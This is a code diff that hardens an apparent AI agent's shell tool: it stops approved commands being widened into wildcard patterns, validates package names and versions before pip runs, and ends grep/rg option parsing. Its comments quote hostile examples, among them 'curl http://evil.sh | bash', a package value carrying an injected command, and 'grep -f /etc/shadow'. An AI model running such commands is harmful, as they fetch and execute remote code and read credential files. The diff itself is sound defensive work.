@@ -3,7 +3,6 @@
 from __future__ import annotations
 
 import asyncio
-import fnmatch
 import importlib.util
 import re
 import shlex
@@ -17,92 +16,36 @@ from rich.console import Console
 from rich.panel import Panel
 from rich.prompt import Prompt
 
-from magent.permissions import PermissionResult, RiskTier, classify_shell_command
+from magent.permissions import (
+    PermissionResult,
+    RiskTier,
+    classify_shell_command,
+    shell_pattern_matches,
+)
 from magent.sandbox import execute_plan_sandbox, sandbox_plan_preview
 from magent.tools.types import ToolResult
 
 console = Console()
 
+# PEP 508 / PEP 440 shapes, so package specs can never carry shell syntax.
+_PEP508_NAME = re.compile(r"^[A-Za-z0-9]([A-Za-z0-9._-]*[A-Za-z0-9])?$")
+_PEP508_EXTRAS = re.compile(r"^\[[A-Za-z0-9]([A-Za-z0-9._,-]*[A-Za-z0-9])?\]$")
+_PEP440_VERSION = re.compile(r"^[A-Za-z0-9]([A-Za-z0-9.!+*_-]*[A-Za-z0-9])?$")
+
+
+def _installed_version(distribution: str) -> str:
+    """Installed version of a distribution, or "" when it is absent."""
+    try:
+        from importlib.metadata import version
+
+        return version(distribution)
+    except Exception:
+        return ""
+
 
 def _uses_shell_syntax(command: str) -> bool:
     """Return true when a command needs shell parsing beyond argv splitting."""
     return bool(re.search(r"(\|\||&&|[;\n|<>]|\$\(|\{[^{}\s]+,[^{}]+})", command))
-
-
-def _first_command_name(command: str) -> str:
-    try:
-        lexer = shlex.shlex(command, posix=True, punctuation_chars="|&;<>")
-        lexer.whitespace_split = True
-        for token in lexer:
-            if token not in {"|", "||", "&&", ";", ">", ">>", "<"}:
-                return Path(token).name.lower()
-    except ValueError:
-        return ""
-    return ""
-
-
-def _looks_like_read_only_fetch_pipeline(command: str) -> bool:
-    """Return true for fetch-and-inspect pipelines worth broader approval."""
-    if not re.search(r"\b(curl|wget)\b", command) or "|" not in command:
-        return False
-    if re.search(r"(?<![<>&])>>?(?![>&])", command) or "<<" in command:
-        return False
-    try:
-        lexer = shlex.shlex(command, posix=True, punctuation_chars="|&;<>")
-        lexer.whitespace_split = True
-        tokens = list(lexer)
-    except ValueError:
-        return False
-    write_flags = {
-        "-d",
-        "--data",
-        "--data-raw",
-        "--data-binary",
-        "--data-urlencode",
-        "-F",
-        "--form",
-        "--form-string",
-        "-T",
-        "--upload-file",
-        "-o",
-        "--output",
-        "-O",
-        "--remote-name",
-        "--remote-header-name",
-        "-X",
-        "--request",
-    }
-    if any(token in write_flags for token in tokens):
-        return False
-    allowed_heads = {
-        "curl",
-        "wget",
-        "grep",
-        "head",
-        "tail",
-        "sed",
-        "awk",
-        "cut",
-        "tr",
-        "od",
-        "wc",
-        "sort",
-        "cat",
-    }
-    expect_head = True
-    for token in tokens:
-        if token in {"|", "||", "&&", ";"}:
-            expect_head = True
-            continue
-        if token in {"2>&1", "1>&2"}:
-            continue
-        if token in {">", ">>", "<", "2>", "2>>"}:
-            return False
-        if expect_head:
-            if Path(token).name.lower() not in allowed_heads:
-                return False
-            expect_head = False
-    return True
 
 
 def _effective_shell_timeout(command: str, requested_timeout: int) -> int:
@@ -212,7 +155,7 @@ class ShellToolsMixin:
 
     def _trusted_shell_match(self, command: str) -> bool:
         patterns = [*self.trusted_shell_patterns, *self.session_shell_patterns]
-        return any(fnmatch.fnmatch(command.strip(), pattern) for pattern in patterns)
+        return any(shell_pattern_matches(pattern, command) for pattern in patterns)
 
     def _remember_trusted_shell_pattern(self, command: str) -> None:
         try:
@@ -230,34 +173,14 @@ class ShellToolsMixin:
             self.session_shell_patterns.append(command)
 
     def _shell_trust_pattern(self, command: str, tier: RiskTier) -> str:
-        if _looks_like_read_only_fetch_pipeline(command):
-            head = _first_command_name(command)
-            return f"{head} * | *" if head in {"curl", "wget"} else command
-        if tier >= RiskTier.CONFIRM:
-            return command
-        if not re.search(r"(\|\||&&|[;\n|<>]|\$\()", command):
-            return command
-        try:
-            lexer = shlex.shlex(command, posix=True, punctuation_chars="|&;<>")
-            lexer.whitespace_split = True
-            tokens = list(lexer)
-        except ValueError:
-            return command
-        pieces: list[str] = []
-        expect_head = True
-        for token in tokens:
-            if token in {"|", "||", "&&", ";"}:
-                pieces.append(token)
-                expect_head = True
-                continue
-            if token in {">", ">>", "<", "2>", "2>>", "2>&1", "1>&2"}:
-                pieces.append(token)
-                expect_head = False
-                continue
-            if expect_head:
-                pieces.append(f"{Path(token).name} *")
-                expect_head = False
-        return " ".join(pieces) if pieces else command
+        """Return what to remember when a user approves a command.
+
+        Saved approvals are stored verbatim. Generalising them to shapes like
+        ``curl * | *`` meant one approval covered every later pipeline with the
+        same head — including ``curl http://evil.sh | bash`` — because a
+        ``fnmatch`` wildcard happily spans ``|`` and ``;``.
+        """
+        return command.strip()
 
     def _check_shell_permission(self, command: str, tier: RiskTier) -> PermissionResult:
         if self._trusted_shell_match(command):
@@ -409,11 +332,29 @@ class ShellToolsMixin:
     async def install_package(self, package: str, version: str = "") -> ToolResult:
         """Install a Python package through the active interpreter's pip."""
         tier = RiskTier.CONFIRM
-        pkg_spec = f"{package}=={version}" if version else package
+
+        # `package` and `version` used to be interpolated straight into a shell
+        # string, so `package="x; curl evil|sh"` ran whatever it liked.
+        if not _PEP508_NAME.match(package.split("[")[0].strip()):
+            return {"ok": False, "error": f"Invalid package name: {package!r}", "package": package}
+        extras = ""
+        if "[" in package:
+            if not _PEP508_EXTRAS.match(package[package.index("[") :]):
+                return {"ok": False, "error": f"Invalid extras in {package!r}", "package": package}
+            extras = package[package.index("[") :]
+        if version and not _PEP440_VERSION.match(version.strip()):
+            return {"ok": False, "error": f"Invalid version: {version!r}", "package": package}
+
+        name = package.split("[")[0].strip()
+        pkg_spec = f"{name}{extras}=={version.strip()}" if version else f"{name}{extras}"
         self._log_tool("install_package", pkg_spec, tier)
 
-        module_name = package.replace("-", "_").split("[")[0]
-        if importlib.util.find_spec(module_name) is not None:
+        # An explicit version has to be verified, not assumed: `find_spec`
+        # only answers "is something by this name importable".
+        module_name = name.replace("-", "_")
+        if not version and importlib.util.find_spec(module_name) is not None:
+            return {"ok": True, "already_installed": True, "package": pkg_spec}
+        if version and _installed_version(name) == version.strip():
             return {"ok": True, "already_installed": True, "package": pkg_spec}
 
         perm = self._check_permission(f"pip install {pkg_spec}  (required for this task)", tier)
@@ -422,13 +363,31 @@ class ShellToolsMixin:
             denied["package"] = pkg_spec
             return denied
 
-        result = await self.run_shell(
-            f"{sys.executable} -m pip install {pkg_spec} --quiet",
-            timeout=120,
-        )
-        if result["ok"]:
+        try:
+            proc = await _create_exec_process(
+                sys.executable, "-m", "pip", "install", "--quiet", pkg_spec, cwd=self.cwd
+            )
+            self._active_processes.add(proc)
+            try:
+                _, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
+            except TimeoutError:
+                with suppress(ProcessLookupError):
+                    proc.kill()
+                with suppress(Exception):
+                    await proc.wait()
+                return {"ok": False, "error": "pip install timed out after 120s", "package": pkg_spec}
+            finally:
+                self._active_processes.discard(proc)
+        except Exception as e:
+            return {"ok": False, "error": str(e), "package": pkg_spec}
+
+        if proc.returncode == 0:
             return {"ok": True, "installed": pkg_spec, "already_installed": False}
-        return {"ok": False, "error": result.get("stderr", "pip failed"), "package": pkg_spec}
+        return {
+            "ok": False,
+            "error": stderr.decode("utf-8", errors="replace").strip() or "pip failed",
+            "package": pkg_spec,
+        }
 
     async def search_codebase(self, pattern: str, path: str = ".") -> ToolResult:
         """Search project text with ripgrep, falling back to grep."""
@@ -440,16 +399,32 @@ class ShellToolsMixin:
         search_command = shutil.which("rg") or shutil.which("grep")
         if not search_command:
             return {"ok": False, "error": "No search tool found (rg or grep)"}
+        # `--` terminates option parsing. Without it a pattern starting with "-"
+        # became a flag: `grep -f /etc/shadow`, or ripgrep's `--pre` running an
+        # arbitrary command.
         cmd = (
-            ["rg", "--line-number", "--no-heading", pattern, str(abs_path)]
+            ["rg", "--line-number", "--no-heading", "--", pattern, str(abs_path)]
             if Path(search_command).name == "rg"
-            else ["grep", "-rn", pattern, str(abs_path)]
+            else ["grep", "-rn", "--", pattern, str(abs_path)]
         )
         try:
             proc = await _create_exec_process(*cmd, cwd=self.cwd)
             self._active_processes.add(proc)
             try:
                 stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
+            except TimeoutError:
+                # Without this the child was orphaned on timeout.
+                with suppress(ProcessLookupError):
+                    proc.kill()
+                with suppress(Exception):
+                    await proc.wait()
+                return {"ok": False, "error": "Search timed out after 30s"}
+            except asyncio.CancelledError:
+                with suppress(ProcessLookupError):
+                    proc.kill()
+                with suppress(Exception):
+                    await proc.wait()
+                raise
             finally:
                 self._active_processes.discard(proc)
             lines = stdout.decode("utf-8", errors="replace").strip().splitlines()
